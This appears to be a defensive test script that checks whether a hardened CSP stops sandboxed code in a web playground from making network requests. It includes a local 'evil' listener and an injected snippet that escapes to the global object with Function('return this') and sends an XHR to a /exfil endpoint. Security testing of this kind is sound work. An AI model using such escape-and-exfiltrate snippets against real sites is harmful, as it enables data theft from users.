// Prova de conceito (fora do repo) de CSP endurecida por recurso, via proxy local 3105 -> next start 3101:
//   /_next/static/*  => default-src 'none'; script-src 'self' 'unsafe-eval'; connect-src 'none'   (vale para o worker)
//   demais respostas => CSP original SEM 'unsafe-eval'
// Compara com o baseline (3101) usando o mesmo código de "escape". Sem rede externa.
import http from 'node:http';
import { createRequire } from 'node:module';
import { writeFileSync } from 'node:fs';
const require = createRequire(import.meta.url);
const { chromium } = require('<repo>/node_modules/.pnpm/playwright-core@1.60.0/node_modules/playwright-core');
const HEADLESS_SHELL = '<home>/.cache/ms-playwright/chromium_headless_shell-1243/chrome-headless-shell-linux64/chrome-headless-shell';
const OUT = process.argv[2];
const STRICT_WORKER_CSP = "default-src 'none'; script-src 'self' 'unsafe-eval'; connect-src 'none'";

const hits = [];
const evil = http.createServer((req, res) => { hits.push(req.url); res.writeHead(200, { 'Access-Control-Allow-Origin': '*', 'Content-Type': 'text/plain' }); res.end('EVIL-OK'); });
await new Promise((r) => evil.listen(4999, '127.0.0.1', r));

const proxy = http.createServer((creq, cres) => {
  const up = http.request({ host: '127.0.0.1', port: 3101, method: creq.method, path: creq.url, headers: { ...creq.headers, host: '127.0.0.1:3101' } }, (ures) => {
    const h = { ...ures.headers };
    if (creq.url.startsWith('/_next/static/')) h['content-security-policy'] = STRICT_WORKER_CSP;
    else if (h['content-security-policy']) h['content-security-policy'] = String(h['content-security-policy']).replace(/\s*'unsafe-eval'/g, '');
    cres.writeHead(ures.statusCode, h); ures.pipe(cres);
  });
  up.on('error', () => { cres.writeHead(502); cres.end(); });
  creq.pipe(up);
});
await new Promise((r) => proxy.listen(3105, '127.0.0.1', r));

const browser = await chromium.launch({ executablePath: HEADLESS_SHELL });
const results = [];

const SAME_ORIGIN_XHR = `const G = Function("return this")(); const x = new G.XMLHttpRequest(); try { x.open("GET", "/examples/manifest.json", false); x.send(); console.log("XHR mesma origem:", x.status); } catch (e) { console.log("XHR mesma origem falhou:", e.name); }`;
const CROSS_ORIGIN_XHR = `const G = Function("return this")(); const x = new G.XMLHttpRequest(); try { x.open("GET", "http://127.0.0.1:4999/exfil?D", false); x.send(); console.log("XHR cross-origin:", x.status); } catch (e) { console.log("XHR cross-origin falhou:", e.name); }`;
const API_XHR = `const G = Function("return this")(); const x = new G.XMLHttpRequest(); try { x.open("POST", "https://api.mock.test/engoiana", false); x.send("{}"); console.log("XHR p/ API:", x.status); } catch (e) { console.log("XHR p/ API falhou:", e.name); }`;

async function runCase(label, base, code) {
  const ctx = await browser.newContext({ viewport: { width: 1280, height: 800 } });
  const page = await ctx.newPage();
  const consoleMsgs = [];
  page.on('console', (m) => consoleMsgs.push(`${m.type()}: ${m.text()}`.slice(0, 260)));
  const entry = { label, base };
  try {
    await page.goto(base + '/');
    await page.locator('.monaco-editor').first().waitFor({ state: 'visible', timeout: 20000 });
    await page.waitForFunction(() => window.monaco && window.monaco.editor.getModels()[0].getValue().includes('Eai sô'));
    await page.evaluate((c) => window.monaco.editor.getModels()[0].setValue(c), code);
    await page.getByRole('button', { name: /Bota pra moer/i }).click();
    await page.getByRole('status').filter({ hasText: /Rodou bonito|Deu ruim|travou/ }).waitFor({ timeout: 10000 });
    entry.saida = (await page.getByRole('tabpanel').innerText()).replace(/\n/g, ' ⏎ ').trim();
  } catch (e) { entry.probeError = String(e.message).split('\n')[0].slice(0, 200); }
  entry.console = consoleMsgs.filter((m) => !/React DevTools/.test(m));
  results.push(entry);
  console.log(`\n=== ${label} @${base}\n  saida: ${entry.saida}${entry.probeError ? '\n  PROBE: ' + entry.probeError : ''}`);
  if (entry.console.length) console.log('  console:', JSON.stringify(entry.console.slice(0, 3)));
  await ctx.close();
}

// baseline (CSP atual) vs endurecida
await runCase('BASE  XHR mesma origem', 'http://127.0.0.1:3101', SAME_ORIGIN_XHR);
await runCase('HARD  XHR mesma origem', 'http://127.0.0.1:3105', SAME_ORIGIN_XHR);
await runCase('BASE  XHR p/ API do engoianador (origem permitida no connect-src)', 'http://127.0.0.1:3101', API_XHR);
await runCase('HARD  XHR p/ API do engoianador', 'http://127.0.0.1:3105', API_XHR);
const before = hits.length;
await runCase('HARD  XHR cross-origin (evil)', 'http://127.0.0.1:3105', CROSS_ORIGIN_XHR);
console.log('  evilHits (HARD):', JSON.stringify(hits.slice(before)));

// regressão: fluxos normais sob a CSP endurecida
{
  const ctx = await browser.newContext({ viewport: { width: 1280, height: 800 } });
  await ctx.route('**/engoiana', (r) => r.fulfill({ status: 200, contentType: 'application/json', headers: { 'access-control-allow-origin': '*' }, body: JSON.stringify({ engoianado: 'Ô sô, tá bão!' }) }));
  const page = await ctx.newPage();
  const consoleMsgs = [];
  page.on('console', (m) => consoleMsgs.push(`${m.type()}: ${m.text()}`.slice(0, 260)));
  await page.goto('http://127.0.0.1:3105/');
  await page.locator('.monaco-editor').first().waitFor({ state: 'visible', timeout: 20000 });
  await page.waitForFunction(() => window.monaco && window.monaco.editor.getModels()[0].getValue().includes('Eai sô'));
  await page.getByLabel('Exemplos:').selectOption({ label: 'Classe Pequi' });
  await page.waitForFunction(() => window.monaco.editor.getModels()[0].getValue().includes('Pequi'));
  await page.getByRole('button', { name: /Bota pra moer/i }).click();
  await page.getByRole('tabpanel').filter({ hasText: /Pequi verde/ }).waitFor({ timeout: 10000 });
  await page.getByRole('link', { name: 'Engoianador' }).click();
  await page.getByRole('button', { name: 'TCP vs UDP' }).click();
  await page.waitForFunction(() => document.querySelector('#saida') && document.querySelector('#saida').value.includes('tá bão'), null, { timeout: 10000 });
  const [dl] = await Promise.all([page.waitForEvent('download', { timeout: 15000 }), page.getByRole('button', { name: /Compartilhar/ }).click()]);
  console.log('\n=== HARD regressão: exemplo Pequi OK, /engoianador OK (API mockada), share PNG baixou:', dl.suggestedFilename());
  console.log('  console durante o fluxo:', JSON.stringify(consoleMsgs.filter((m) => !/React DevTools/.test(m)).slice(0, 5)));
  results.push({ label: 'HARD regressão', ok: true, console: consoleMsgs });
  await ctx.close();
}

writeFileSync(OUT, JSON.stringify(results, null, 2));
await browser.close(); evil.close(); proxy.close();
